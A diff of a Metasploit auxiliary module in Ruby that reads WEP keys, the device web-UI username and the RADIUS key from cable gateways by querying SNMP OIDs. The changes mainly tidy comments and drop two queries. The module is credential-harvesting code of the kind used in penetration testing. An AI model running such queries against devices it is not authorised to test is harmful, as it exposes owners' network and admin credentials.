@@ -75,6 +75,7 @@ class Metasploit3 < Msf::Auxiliary
             wep_encryption = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.1.1.2.32').to_i
             wep_encryption_name = "unknown"
             wep_key1 = wep_key2 = wep_key3 = wep_key4 = ""
+            # get appropriate WEP keys based on wep_encryption setting
             if wep_encryption == 1
               wep_encryption_name = "64-bit"
               # TODO: need to test what to_s does to the SNMP hex-string
@@ -96,9 +97,8 @@ class Metasploit3 < Msf::Auxiliary
             output_data["WEP Key 3"] = wep_key3.strip
             output_data["WEP Key 4"] = wep_key4.strip
 
-            # Get current network key.
-            #= Gauge32: 1 / = Gauge32: 2  = Gauge32: 3 = Gauge32: 4
-            # TODO: need to test what to_i does to Gauge32
+            # get current network key
+            # TODO: need to test what to_i does to Gauge32: Gauge32: 1 / = Gauge32: 2  = Gauge32: 3 = Gauge32: 4
             currentKey = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.1.1.1.32').to_i
             output_data["Current Network Key"] = currentKey
 
@@ -128,10 +128,12 @@ class Metasploit3 < Msf::Auxiliary
 
         # attempt to get the username and password for the device user interface
         # using the CableHome cabhPsDevMib MIB module which defines the
-        # basic management objects for the Portal Services logical element
+        # basic management objects for the Portal Services (PS) logical element
         # of a CableHome compliant Residential Gateway device
         deviceUiSelection = snmp.get_value('1.3.6.1.4.1.4491.2.4.1.1.6.1.3.0').to_i
         if deviceUiSelection == 1
+          # manufacturerLocal(1) - indicates Portal Services is using the vendor
+          # web user interface shipped with the device
           deviceUiUsername = snmp.get_value('1.3.6.1.4.1.4491.2.4.1.1.6.1.1.0').to_s
           output_data["Device UI Username"] = deviceUiUsername.strip
 
@@ -238,12 +240,6 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def get_radius_info(snmp, output_data)
-    # Group Key Rotation Interval is the only one not identified,
-    # however, I believe that value was 0 and not 1
-    # TODO: confirm this is the correct OID
-    rotation_interval = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.5.1.1.32').to_i
-    output_data["Group Key Rotation Interval"] = rotation_interval
-
     radius_server = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.5.1.2.32').to_s
     # TODO: Hex-STRING IP Address hex value of each octet, convert hex octets to IP address 
     output_data["RADIUS Server"] = radius_server.strip
@@ -254,10 +250,6 @@ class Metasploit3 < Msf::Auxiliary
 
     radius_key = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.5.1.4.32').to_s
     output_data["RADIUS Key"] = radius_key.strip
-
-    reauth_interval = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.5.1.5.32').to_i
-    # TODO does Gauge32 convert to int?
-    output_data["WPA/WPA2 Re-auth Interval"] = reauth_interval
   end
 
 end
